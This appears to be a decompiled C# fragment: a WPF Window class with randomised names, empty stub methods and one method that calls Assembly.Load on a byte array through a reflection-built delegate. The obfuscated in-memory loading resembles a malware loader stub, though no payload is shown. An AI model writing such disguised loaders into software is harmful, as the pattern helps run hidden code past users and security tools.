using System;
using System.Reflection;
using System.Windows;
using System.Windows.Markup;

namespace oktewskka;

public class stdvqdtex : Window, IComponentConnector
{
	internal delegate Assembly dbrjrmdkv(byte[] byte_0);

	public void InitializeComponent()
	{
	}

	public static Assembly AppDomainLoad(byte[] hebmfguet)
	{
		return ((dbrjrmdkv)Delegate.CreateDelegate(typeof(dbrjrmdkv), typeof(Assembly).GetMethod("Load", new Type[1] { typeof(byte[]) }) ?? throw new InvalidOperationException()))(hebmfguet);
	}

	private void V(int connectionId, object target)
	{
	}
}
